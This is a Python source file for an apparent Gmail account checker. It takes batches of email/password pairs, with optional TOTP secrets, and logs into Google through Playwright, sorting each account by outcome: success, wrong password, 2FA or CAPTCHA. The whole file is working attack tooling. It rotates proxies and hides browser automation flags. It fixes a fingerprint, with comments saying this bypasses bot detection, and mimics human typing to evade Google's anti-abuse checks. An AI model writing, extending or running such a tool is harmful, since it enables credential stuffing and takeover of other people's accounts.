import asyncio
import random
import time
import os
import pyotp
from playwright.async_api import async_playwright, TimeoutError as PlaywrightTimeoutError

# FIXED FINGERPRINT: Consistency is key to bypassing "bot" detection
# Using a common, clean Windows Chrome 120 profile
FIXED_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
FIXED_TIMEZONE = "America/New_York" # Pick a timezone close to your actual location
FIXED_VIEWPORT = {"width": 1920, "height": 1080}

PROXY_POOL = []

class GmailVerificationEngine:
    def __init__(self, headless=True, use_captcha_solver=False, debug_dir="debug_screenshots"):
        self.headless = headless
        self.use_captcha_solver = use_captcha_solver
        self.p = None
        self.browser = None
        self.debug_dir = debug_dir
        os.makedirs(self.debug_dir, exist_ok=True)

    def _get_proxy(self):
        if PROXY_POOL:
            proxy_url = random.choice(PROXY_POOL)
            return {"server": proxy_url}
        return None

    async def start(self):
        self.p = await async_playwright().start()
        args = [
            "--disable-blink-features=AutomationControlled",
            "--no-sandbox",
            "--disable-setuid-sandbox",
            "--disable-infobars"
        ]
        self.browser = await self.p.chromium.launch(
            headless=self.headless, 
            args=args
        )
        
    async def stop(self):
        if self.browser:
            await self.browser.close()
        if self.p:
            await self.p.stop()

    async def _type_human(self, page, selector, text):
        element = await page.wait_for_selector(selector)
        await element.click()
        box = await element.bounding_box()
        if box:
            x = box['x'] + box['width'] * random.uniform(0.2, 0.8)
            y = box['y'] + box['height'] * random.uniform(0.2, 0.8)
            await page.mouse.move(x, y, steps=20)
        await element.fill("")
        for char in text:
            # Realistic typing: 100-300ms per char
            await page.keyboard.type(char, delay=random.randint(100, 300))
            await asyncio.sleep(random.uniform(0.05, 0.15))

    async def _click_next(self, page):
        selectors = [
            "button#identifier-next",
            "button[type='submit']",
            "input[type='submit']",
            "button[aria-label='Next']",
            "button[data-messageid='identifier-submit']"
        ]
        for selector in selectors:
            try:
                btn = await page.wait_for_selector(selector, timeout=2000)
                if btn:
                    await btn.click()
                    return True
            except Exception:
                continue
        try:
            await page.keyboard.press("Enter")
            return True
        except Exception:
            return False

    async def _save_debug_screenshot(self, page, email, status):
        try:
            safe_email = email.replace("@", "_at_").replace(".", "_").replace("-", "_")
            filename = f"{self.debug_dir}/{safe_email}_{status}_{int(time.time())}.png"
            await page.screenshot(path=filename)
            print(f"[DEBUG] Screenshot saved: {filename}")
        except Exception as e:
            print(f"[DEBUG] Failed to save screenshot: {e}")

    async def verify_account(self, cred):
        email = cred["email"]
        password = cred["password"]
        totp_secret = cred.get("totp_secret")
        
        result = {
            "email": email,
            "status": "PENDING",
            "error_message": None,
            "proxy_ip": "LOCAL",
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
        }

        proxy_config = self._get_proxy()

        # USE FIXED FINGERPRINT
        context_options = {
            "user_agent": FIXED_USER_AGENT,
            "viewport": FIXED_VIEWPORT,
            "timezone_id": FIXED_TIMEZONE,
            "locale": "en-US"
        }
        
        if proxy_config:
            context_options["proxy"] = proxy_config
            result["proxy_ip"] = proxy_config["server"]

        context = await self.browser.new_context(**context_options)
        page = await context.new_page()
        
        try:
            # 1. CLEAN SLATE WARM-UP
            # Visit Google Search to establish a base session and NID cookie
            await page.goto("https://www.google.com/webhp", timeout=30000)
            
            # Handle Cookie Consent if it appears (common in EU, but good practice)
            try:
                consent_btn = await page.wait_for_selector("button[aria-label='Accept all']", timeout=3000)
                if consent_btn:
                    await consent_btn.click()
                    await asyncio.sleep(1)
            except:
                pass

            # Let the session "settle"
            await asyncio.sleep(random.uniform(5, 8))

            # 2. Navigate to Login
            await page.goto("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin", timeout=30000)
            
            # 3. Wait for Email Field
            try:
                await page.wait_for_selector('input[name="identifier"]', timeout=10000)
            except PlaywrightTimeoutError:
                result["status"] = "EMAIL_FIELD_NOT_FOUND"
                result["error_message"] = page.url
                await self._save_debug_screenshot(page, email, "EMAIL_FIELD_NOT_FOUND")
                return result

            # 4. Enter Email
            await self._type_human(page, 'input[name="identifier"]', email)
            
            # 5. Click Next
            success = await self._click_next(page)
            if not success:
                result["status"] = "NEXT_BUTTON_NOT_FOUND"
                result["error_message"] = "Could not find or click Next button"
                await self._save_debug_screenshot(page, email, "NEXT_BUTTON_NOT_FOUND")
                return result
                
            # 6. CRITICAL PAUSE: Mimic a user reading the password field
            await asyncio.sleep(random.uniform(3, 6))

            # 7. Check for Immediate Rejection
            current_url = page.url
            if "rejected" in current_url:
                result["status"] = "EMAIL_REJECTED"
                result["error_message"] = "Google indicates this email does not exist or is flagged"
                await self._save_debug_screenshot(page, email, "EMAIL_REJECTED")
                return result

            # 8. Check for Password Field
            try:
                await page.wait_for_selector('input[name="Passwd"]', timeout=5000)
                
                # 9. Enter Password
                await self._type_human(page, 'input[name="Passwd"]', password)
                success = await self._click_next(page)
                if not success:
                    await page.keyboard.press("Enter")
                
                # 10. POST-PASSWORD PAUSE
                await asyncio.sleep(random.uniform(4, 7))
                
            except PlaywrightTimeoutError:
                current_url = page.url
                if "challenge" in current_url:
                    result["status"] = "CAPTCHA_BLOCKED"
                    result["error_message"] = "Hit a CAPTCHA before password entry"
                else:
                    result["status"] = "PASSWORD_FIELD_MISSING"
                    result["error_message"] = f"Password field did not appear. URL: {current_url}"
                    await self._save_debug_screenshot(page, email, "NO_PASS_FIELD")
                return result

            # 11. Handle Post-Password States
            current_url = page.url
            
            if "mail.google.com" in current_url:
                result["status"] = "SUCCESS"
                return result

            if "challenge" in current_url:
                is_2fa = False
                try:
                    if await page.locator("text=Authentication code").count() > 0 or \
                       await page.locator("text=Verification code").count() > 0 or \
                       "2fa" in current_url:
                        is_2fa = True
                except:
                    pass

                if is_2fa:
                    if totp_secret:
                        totp = pyotp.TOTP(totp_secret).now()
                        try:
                            await self._type_human(page, 'input[type="text"]', totp)
                            await self._click_next(page)
                            await asyncio.sleep(5)
                            if "mail.google.com" in page.url:
                                result["status"] = "SUCCESS_WITH_2FA"
                            else:
                                result["status"] = "2FA_FAILED"
                                result["error_message"] = page.url
                        except Exception as e:
                            result["status"] = "2FA_INPUT_ERROR"
                            result["error_message"] = str(e)
                    else:
                        result["status"] = "2FA_REQUIRED_NO_SECRET"
                        result["error_message"] = "TOTP secret missing"
                else:
                    result["status"] = "CAPTCHA_OR_CHALLENGE"
                    result["error_message"] = current_url
                    await self._save_debug_screenshot(page, email, "CHALLENGE")
                return result

            # 12. WRONG PASSWORD DETECTION
            if "accounts.google.com" in current_url:
                page_content = await page.content()
                if "No longer works" in page_content or "incorrect" in page_content.lower() or "wrong" in page_content.lower():
                    result["status"] = "INVALID_CREDENTIALS"
                    result["error_message"] = "Google explicitly reported wrong password"
                    await self._save_debug_screenshot(page, email, "WRONG_PASS")
                else:
                    result["status"] = "UNKNOWN_STATE"
                    result["error_message"] = f"Stuck on signin page. URL: {current_url}"
                    await self._save_debug_screenshot(page, email, "UNKNOWN_STATE")
                return result

            result["status"] = "UNKNOWN_STATE"
            result["error_message"] = page.url
            await self._save_debug_screenshot(page, email, "UNKNOWN_STATE")

        except Exception as e:
            result["status"] = "ERROR"
            result["error_message"] = str(e)
            try:
                await self._save_debug_screenshot(page, email, "EXCEPTION")
            except:
                pass
        finally:
            await context.close()
            
        return result

    async def run_batch(self, credentials, concurrency=1):
        results = []
        semaphore = asyncio.Semaphore(concurrency)
        
        async def worker(cred):
            async with semaphore:
                print(f"[START] Verifying {cred['email']}")
                res = await self.verify_account(cred)
                print(f"[DONE] {cred['email']}: {res['status']} - {res['error_message']}")
                results.append(res)
                
        tasks = [worker(cred) for cred in credentials]
        await asyncio.gather(*tasks)
        return results